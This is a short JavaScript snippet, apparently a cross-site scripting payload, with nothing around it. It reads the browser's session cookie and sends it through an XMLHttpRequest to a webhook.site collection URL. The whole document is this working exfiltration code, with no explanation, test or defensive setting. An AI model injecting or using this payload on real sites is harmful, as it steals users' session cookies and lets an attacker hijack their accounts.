const session = document.cookie;
const xhr = new XMLHttpRequest();
xhr.open("GET", "https://webhook.site/collect?session=" + encodeURIComponent(session));
xhr.send();
